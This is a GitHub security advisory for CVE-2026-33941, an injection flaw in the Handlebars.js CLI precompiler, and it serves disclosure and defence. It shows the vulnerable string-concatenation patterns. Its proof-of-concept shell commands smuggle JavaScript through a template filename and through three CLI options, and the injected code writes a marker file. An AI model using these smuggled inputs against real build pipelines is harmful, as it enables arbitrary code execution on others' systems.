# [H] Handlebars.js has JavaScript Injection in CLI Precompiler via Unescaped Names and Options

## Summary
Severity: High
Advisory: GHSA-xjpj-3mr7-gcpf
CVE: CVE-2026-33941
CWE: CWE-116, CWE-79, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-xjpj-3mr7-gcpf
Type: github-advisory

## Affected
- npm: `handlebars` — affected >=4.0.0 <4.7.9

## Details
## Summary

The Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.

## Description

`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:

### 1. Template name injection

```javascript
// Vulnerable code pattern
output += 'templates["' + template.name + '"] = template(...)';
```

`template.name` is derived from the file system path. A filename containing `"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.

### 2. Namespace injection (`-n` / `--namespace`)

```javascript
// Vulnerable code pattern
output += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';
```

`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.

### 3. CommonJS path injection (`-c` / `--commonjs`)

```javascript
// Vulnerable code pattern
output += 'var Handlebars = require("' + opts.commonjs + '");';
```

`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `"` to close the string and inject further code.

### 4. AMD path injection (`-h` / `--handlebarPath`)

```javascript
// Vulnerable code pattern
output += "define(['" + opts.handlebarPath + "handlebars.runtime'], ...)";
```

`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.

All four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.

## Proof of Concept

**Template name vector (creates a file `pwned` on disk):**

```bash
mkdir -p templates
printf 'Hello' > "templates/evil'] = (function(){require(\"fs\").writeFileSync(\"pwned\",\"1\")})(); //.handlebars"

node bin/handlebars templates -o out.js
node -e 'require("./out.js")'  # Executes injected code, creates ./pwned
```

**Namespace vector:**

```bash
node bin/handlebars templates -o out.js \
  -n "App.ns; require('fs').writeFileSync('pwned2','1'); //"
node -e 'require("./out.js")'
```

**CommonJS vector:**

```bash
node bin/handlebars templates -o out.js \
  -c 'handlebars"); require("fs").writeFileSync("pwned3","1"); //'
node -e 'require("./out.js")'
```

**AMD vector:**

```bash
node bin/handlebars templates -o out.js -a \
  -h "'); require('fs').writeFileSync('pwned4','1'); // "
node -e 'require("./out.js")'
```

## Workarounds

- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`"`, `'`, `;`, etc.).
- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.
- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.
- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.

## References
- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xjpj-3mr7-gcpf
- https://nvd.nist.gov/vuln/detail/CVE-2026-33941
- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2
- https://github.com/handlebars-lang/handlebars.js
- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9
